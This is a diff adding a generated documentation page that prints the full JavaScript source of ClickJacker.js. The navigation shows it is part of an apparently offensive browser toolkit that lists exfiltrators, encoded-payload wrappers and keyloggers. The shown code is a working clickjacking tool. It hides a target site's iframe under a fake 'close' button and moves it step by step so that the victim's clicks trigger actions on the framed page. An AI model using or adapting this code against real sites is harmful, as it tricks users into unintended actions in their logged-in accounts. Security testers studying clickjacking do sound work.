@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>ClickJacker.js - Documentation</title>
+
+    <script src="scripts/prettify/prettify.js"></script>
+    <script src="scripts/prettify/lang-css.js"></script>
+    <script src="scripts/graphs.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+    <link type="text/css" rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <link type="text/css" rel="stylesheet" href="styles/prettify-tomorrow.css">
+    <link type="text/css" rel="stylesheet" href="styles/graph.css">
+    <link type="text/css" rel="stylesheet" href="styles/jsdoc-default.css">
+</head>
+<body>
+
+<input type="checkbox" id="nav-trigger" class="nav-trigger" />
+<label for="nav-trigger" class="navicon-button x">
+  <div class="navicon"></div>
+</label>
+
+<label for="nav-trigger" class="overlay"></label>
+
+<nav class="nav">
+    <h2><a href="index.html">Home</a></h2><h3>Modules</h3><ul><li><a href="module-utils.html">utils</a><ul class='methods'><li data-type='method'><a href="module-utils.html#.buildUrl">buildUrl</a></li><li data-type='method'><a href="module-utils.html#.createElement">createElement</a></li><li data-type='method'><a href="module-utils.html#.createFrame">createFrame</a></li><li data-type='method'><a href="module-utils.html#.loadUglify">loadUglify</a></li><li data-type='method'><a href="module-utils.html#.randInt">randInt</a></li></ul></li></ul><h3>Classes</h3><ul><li><a href="ClickJacker.html">ClickJacker</a><ul class='methods'><li data-type='method'><a href="ClickJacker.html#addStep">addStep</a></li><li data-type='method'><a href="ClickJacker.html#run">run</a></li></ul></li><li><a href="Exfiltrators.html">Exfiltrators</a><ul class='methods'><li data-type='method'><a href="Exfiltrators.html#.console">console</a></li><li data-type='method'><a href="Exfiltrators.html#.get">get</a></li><li data-type='method'><a href="Exfiltrators.html#.iframe">iframe</a></li><li data-type='method'><a href="Exfiltrators.html#.img">img</a></li><li data-type='method'><a href="Exfiltrators.html#.message">message</a></li><li data-type='method'><a href="Exfiltrators.html#.post">post</a></li><li data-type='method'><a href="Exfiltrators.html#.postJSON">postJSON</a></li><li data-type='method'><a href="Exfiltrators.html#.sendBeacon">sendBeacon</a></li><li data-type='method'><a href="Exfiltrators.html#.style">style</a></li></ul></li><li><a href="MessageHandler.html">MessageHandler</a><ul class='methods'><li data-type='method'><a href="MessageHandler.html#addListener">addListener</a></li><li data-type='method'><a href="MessageHandler.html#listen">listen</a></li><li data-type='method'><a href="MessageHandler.html#logMessages">logMessages</a></li><li data-type='method'><a href="MessageHandler.html#removeListener">removeListener</a></li><li data-type='method'><a href="MessageHandler.html#stop">stop</a></li><li data-type='method'><a href="MessageHandler.html#waitForMessage">waitForMessage</a></li></ul></li><li><a href="Payload.html">Payload</a><ul class='methods'><li data-type='method'><a href="Payload.html#.new">new</a></li><li data-type='method'><a href="Payload.html#addExfiltrator">addExfiltrator</a></li><li data-type='method'><a href="Payload.html#asDOM">asDOM</a></li><li data-type='method'><a href="Payload.html#eval">eval</a></li><li data-type='method'><a href="Payload.html#exfiltrate">exfiltrate</a></li><li data-type='method'><a href="Payload.html#fetch">fetch</a></li><li data-type='method'><a href="Payload.html#fetchDOM">fetchDOM</a></li><li data-type='method'><a href="Payload.html#fetchJSON">fetchJSON</a></li><li data-type='method'><a href="Payload.html#fetchText">fetchText</a></li><li data-type='method'><a href="Payload.html#findBetween">findBetween</a></li><li data-type='method'><a href="Payload.html#forEach">forEach</a></li><li data-type='method'><a href="Payload.html#guard">guard</a></li><li data-type='method'><a href="Payload.html#injectStyle">injectStyle</a></li><li data-type='method'><a href="Payload.html#log">log</a></li><li data-type='method'><a href="Payload.html#map">map</a></li><li data-type='method'><a href="Payload.html#parallel">parallel</a></li><li data-type='method'><a href="Payload.html#passthru">passthru</a></li><li data-type='method'><a href="Payload.html#persist">persist</a></li><li data-type='method'><a href="Payload.html#postMessage">postMessage</a></li><li data-type='method'><a href="Payload.html#postMultipart">postMultipart</a></li><li data-type='method'><a href="Payload.html#querySelector">querySelector</a></li><li data-type='method'><a href="Payload.html#querySelectorAll">querySelectorAll</a></li><li data-type='method'><a href="Payload.html#redirect">redirect</a></li><li data-type='method'><a href="Payload.html#regExtract">regExtract</a></li><li data-type='method'><a href="Payload.html#setExfiltrator">setExfiltrator</a></li><li data-type='method'><a href="Payload.html#startClickLogger">startClickLogger</a></li><li data-type='method'><a href="Payload.html#startKeyLogger">startKeyLogger</a></li><li data-type='method'><a href="Payload.html#wait">wait</a></li></ul></li><li><a href="Wrapper.html">Wrapper</a><ul class='methods'><li data-type='method'><a href="Wrapper.html#.new">new</a></li><li data-type='method'><a href="Wrapper.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_HTML.html">Wrapper_HTML</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTML.html#append">append</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_HTML.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_HTML.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTML.html#innerHTML">innerHTML</a></li><li data-type='method'><a href="Wrapper_HTML.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_HTML.html#wrap">wrap</a></li><li data-type='method'><a href="Wrapper_HTML.html#write">write</a></li></ul></li><li><a href="Wrapper_HTMLDataUrl.html">Wrapper_HTMLDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#windowOpen">windowOpen</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JS.html">Wrapper_JS</a><ul class='methods'><li data-type='method'><a href="Wrapper_JS.html#append">append</a></li><li data-type='method'><a href="Wrapper_JS.html#appendScript">appendScript</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_JS.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_JS.html#evalB64">evalB64</a></li><li data-type='method'><a href="Wrapper_JS.html#evalStringForCharCode">evalStringForCharCode</a></li><li data-type='method'><a href="Wrapper_JS.html#imgError">imgError</a></li><li data-type='method'><a href="Wrapper_JS.html#inputFocus">inputFocus</a></li><li data-type='method'><a href="Wrapper_JS.html#minify">minify</a></li><li data-type='method'><a href="Wrapper_JS.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_JS.html#script">script</a></li><li data-type='method'><a href="Wrapper_JS.html#svgLoad">svgLoad</a></li><li data-type='method'><a href="Wrapper_JS.html#templateString">templateString</a></li><li data-type='method'><a href="Wrapper_JS.html#url">url</a></li><li data-type='method'><a href="Wrapper_JS.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSDataUrl.html">Wrapper_JSDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSDataUrl.html#script">script</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#scriptImport">scriptImport</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSUrl.html">Wrapper_JSUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSUrl.html#embed">embed</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#object">object</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#redirect">redirect</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#wrap">wrap</a></li></ul></li></ul>
+</nav>
+
+<div id="main">
+    
+    <h1 class="page-title">ClickJacker.js</h1>
+    
+
+    <!--container.tmpl-->
+
+
+
+
+    <!--source.tmpl-->
+
+    <section>
+        <article>
+            <pre class="prettyprint source linenums"><code>
+import { createElement, randInt } from "./utils.js"
+
+
+const css = `
+
+.clickjacker * {
+    margin: 0;
+    padding: 0;
+  }
+
+  .clickjacker {
+    --c-x: calc(var(--x) + var(--w) / 2);
+    --c-y: calc(var(--y) + var(--h) / 2);
+    --size: 25px;
+    --bg-color: white;
+    background: rgba(0, 0, 0, 0.5);
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100vh;
+    width: 100vw;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .clickjacker .inner {
+    position: relative;
+  }
+
+  .clickjacker .fake-container {
+    border: 2px solid black;
+  }
+
+  .clickjacker .inner .close {
+    position: absolute;
+    top: 0;
+    right: 0;
+    transform: translate(40%, -40%);
+  }
+  .clickjacker .inner > div:hover .frame-container::after {
+    font-weight: bold;
+  }
+  .clickjacker .frame-container {
+    box-sizing: border-box;
+    position: relative;
+    width: var(--size);
+    height: var(--size);
+    overflow: hidden;
+    border-radius: 100%;
+    border: 2px solid black;
+  }
+  .clickjacker:not(.debug) .frame-container::after {
+    box-sizing: border-box;
+    content: "×";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: white;
+    pointer-events: none;
+    color: black;
+  }
+
+  .clickjacker .frame-container iframe {
+    position: absolute;
+    border: none;
+    width: 100vw;
+    height: 1000vh;
+    top: calc(var(--c-y) * -1px + var(--size) / 2);
+    left: calc(var(--c-x) * -1px + var(--size) / 2);
+  }
+`
+
+function closeMe() {
+    const width = randInt(400, 600)
+    const height = randInt(400, 600)
+    const randomColor = randInt(0, 0xfff)
+    const bg = ("000" + randomColor.toString(16)).slice(-3)
+    const el = createElement("div", {
+        innerText: "Close me.",
+        style: {
+            width: `${width}px`,
+            height: `${height}px`,
+            background: `#${bg}`,
+            color: "white",
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            fontSize: "2em",
+        }
+    })
+    return el
+}
+
+
+function createSkeleton(url, debug=false) {
+    const frame = createElement("iframe", { src: url })
+    const fakeContainer = createElement("div", { className: "fake-container" })
+    const focusGetter = createElement("input", {
+        style: {
+            position: "fixed",
+            top: "-1000px"
+        }
+    })
+    const el = createElement("div", { className: `clickjacker${debug ? ' debug': ''}`}, [
+        createElement("div", { className: "inner" }, [
+            createElement("div", { className: "close" }, [
+                createElement("div", { className: "frame-container" }, [
+                    frame
+                ])
+            ]),
+            fakeContainer,
+            focusGetter
+        ])
+    ])
+
+    const setFake = el => {
+        fakeContainer.innerHTML = ""
+        fakeContainer.appendChild(el)
+    }
+    const setPos = (box) => {
+        el.style.setProperty("--x", box.x)
+        el.style.setProperty("--y", box.y)
+        el.style.setProperty("--w", box.width || 0)
+        el.style.setProperty("--h", box.height || 0)
+    }
+    const setFocus = () => focusGetter.focus()
+    return { el, frame, setFake, setPos, setFocus }
+}
+
+function waitForFocus(f) {
+    return new Promise(resolve => {
+
+        const blurListener = () => {
+            setTimeout(async () => {
+                if (document.activeElement == f) {
+                    window.removeEventListener("blur", blurListener)
+                    resolve()
+                }
+            }, 200);
+        };
+
+        window.addEventListener("blur", blurListener);
+    })
+}
+
+/**
+ * 
+ * @typedef {Object} BoundingBox
+ * @property {number} x - The X coordinate
+ * @property {number} y - The Y coordinate
+ * @property {number} [width=0] - The width of the box
+ * @property {number} [height=0] - The height of the box
+ */
+
+/**
+ * Tools box for clickjacking attacks
+ * @class
+ * @example
+ * const cj = new ClickJacker(url)
+ *       .addStep({ x: 8, y: 8, width: 93.53, height: 29 })
+ *       .addStep({ x: 101.53, y: 8, height: 29, width: 93.53 })
+ *       .addStep({ x: 195.06, y: 8, height: 29, width: 93.53 })
+ * await cj.run()
+ */
+class ClickJacker {
+    /**
+     * 
+     * @param {String} url Target url for clickjacking
+     * @param {Boolean} [debug=false] Run in debug mode, the iframe is not hidden
+     * @example
+     * new ClickJacker("vulnerable.com").addStep({x: 10, y:22}).run()
+     */
+    constructor(url, debug=false) {
+        this.debug = debug
+        this.url = url
+        this.steps = []
+    }
+
+    _init() {
+        return new Promise(resolve => {
+            const id = "ClickJackerCSS"
+            if (document.getElementById(id))
+                return resolve()
+            const s = document.createElement("style")
+            s.id = id
+            s.innerText = css
+            s.onload = () => resolve();
+            (document.header || document.documentElement).appendChild(s)
+        })
+    }
+
+    /**
+     * Add a step in the current ClickJacker, the iframe will be centered according to the bounding box.
+     * @param {BoundingBox} box Coordinate of the clickable element in the vulnerable page
+     * @param {HTMLElement} [content=null] Html element to put in the popup, if null, render a "close me" popup 
+     * @param {number} [wait=200]  Time to wait after a click has been detected
+     * @returns {ClickJacker} Return itself
+     */
+    addStep(box, content = null, wait = 200) {
+        this.steps.push({ box, content, wait })
+        return this
+    }
+
+    /**
+     * Start the ClickJacking process. 
+     * @returns {Promise&lt;ClickJacker>} Return itself
+     */
+    async run() {
+        await this._init()
+        const skel = createSkeleton(this.url, this.debug)
+        document.body.appendChild(skel.el)
+        skel.setFocus()
+        for (const step of this.steps) {
+            skel.setFake(step.content ? step.content : closeMe())
+            skel.setPos(step.box)
+            await waitForFocus(skel.frame)
+            skel.setFocus()
+        }
+        skel.el.style.left = "1000vw"
+        return this
+    }
+
+}
+
+export default ClickJacker</code></pre>
+        </article>
+    </section>
+
+
+
+
+
+</div>
+
+<br class="clear">
+
+<footer>
+    Documentation generated by <a href="https://github.com/jsdoc3/jsdoc">JSDoc 3.6.6</a> on Sun Mar 14 2021 13:45:10 GMT+0100 (Central European Standard Time) using the LOKE theme.
+</footer>
+
+<script>prettyPrint();</script>
+<script src="scripts/linenumber.js"></script>
+<script>window.addEventListener("DOMContentLoaded", initGraphs)</script>
+</body>
+</html>
